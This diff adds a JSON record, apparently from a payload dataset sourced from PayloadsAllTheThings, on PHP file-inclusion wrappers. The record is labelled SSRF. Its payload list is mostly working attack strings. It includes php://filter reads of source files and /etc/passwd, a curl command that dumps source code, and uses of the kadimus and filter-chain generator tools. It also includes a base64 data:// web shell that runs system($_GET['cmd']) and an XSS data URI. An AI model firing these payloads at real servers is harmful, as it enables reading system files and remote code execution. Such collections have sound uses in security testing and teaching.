@@ -1,0 +1,27 @@
+{
+  "id": "ssrf-d0b20a50e2e2",
+  "category": "SSRF",
+  "title": "Wrappers",
+  "description": "# Inclusion Using Wrappers\n\nA wrapper in the context of file inclusion vulnerabilities refers to the protocol or method used to access or include a file. Wrappers are often used in PHP or other server-side languages to extend how file inclusion functions, enabling the use of protocols like HTTP, FTP, and others in addition to the local filesystem.\n\n## Summary\n\n- [Wrapper php://filter](#wrapper-phpfilter)\n- [Wrapper data://](#wrapper-data)\n- [Wrapper expect://](#wrapper-expect)\n- [Wrapper input:/",
+  "payloads": [
+    "http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php",
+    "http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
+    "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php",
+    "http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php",
+    "http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
+    "./kadimus -u \"http://example.com/index.php?page=vuln\" -S -f \"index.php%00\" -O index.php --parameter page",
+    "curl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d > index.php",
+    "- [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) - A CLI to generate PHP filters chain",
+    "$ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'",
+    "[+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)",
+    "- [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py) to generate a custom payload.",
+    "# executed PHP code: <?=`$_GET[0]`;;?>",
+    "The payload encoded in base64 is \"`<?php system($_GET['cmd']);echo 'Shell done !'; ?>`\".",
+    "http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
+    "Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`"
+  ],
+  "references": [
+    "PayloadsAllTheThings/File Inclusion/Wrappers.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
